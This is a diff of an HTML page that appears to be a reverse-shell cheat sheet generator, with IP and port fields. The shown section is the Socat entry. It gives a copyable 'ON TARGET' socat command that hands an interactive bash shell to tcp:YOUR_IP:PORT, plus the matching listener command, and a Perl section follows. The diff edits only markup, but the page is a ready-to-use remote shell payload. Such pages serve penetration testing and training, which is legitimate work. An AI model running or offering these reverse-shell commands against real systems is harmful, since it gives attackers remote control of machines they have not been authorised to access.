@@ -151,9 +151,10 @@ Your Port: <input type="text" id="PORT" placeholder="desired port" value="">
 <h2 id="socat">Socat</h2>
 <p> </p>
 <div id="to-copy-socat-remote" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ON TARGET: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:PORT
+</code></pre></div>
 <div id="to-copy-socat-local" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ON LOCAL: socat file:tty,raw,echo=0 tcp-listen:PORT
 </code></pre></div>
-<button onClick="CopyToClipboard('to-copy-socat-remote')">Copy-Local</button>
+<button onClick="CopyToClipboard('to-copy-socat-remote')">Copy-Local </button>
 <button onClick="CopyToClipboard('to-copy-socat-local')">Copy-Remote</button>
 <p> </p>
 <h2 id="perl">Perl</h2>
